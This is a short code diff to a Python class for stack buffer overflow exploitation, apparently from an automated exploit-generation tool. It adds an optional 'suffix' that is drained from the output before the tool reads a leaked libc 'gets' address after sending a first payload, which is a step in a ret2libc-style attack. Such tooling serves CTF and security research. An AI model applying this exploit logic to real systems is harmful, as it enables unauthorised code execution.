@@ -61,6 +61,8 @@ class StackBufferOverflowVulnerability(Vulnerability):
                 arg = [v for v in self.function["variables"] if v["name"] == arg][0]
                 stackoffset = arg["stackOffset"]
                 self.stackOffset = arg["stackOffset"]
+                # TODO: automatically determine "suffix"
+                self.suffix = None
                 return True
             continue
             if call["funcName"] == "read":
@@ -105,6 +107,12 @@ class StackBufferOverflowVulnerability(Vulnerability):
         # read libc location
         logger.info("Sending first payload")
         conn.sendline(payload1)
+
+        # Need to perform drain of non libc stuff
+        if self.suffix:
+            conn.recvuntil(self.suffix)
+
+        # Now we are at the actual payload
         gets_location = conn.recvline()[:-1]
         logger.info(gets_location)
         gets_location = int.from_bytes(gets_location, byteorder='little')
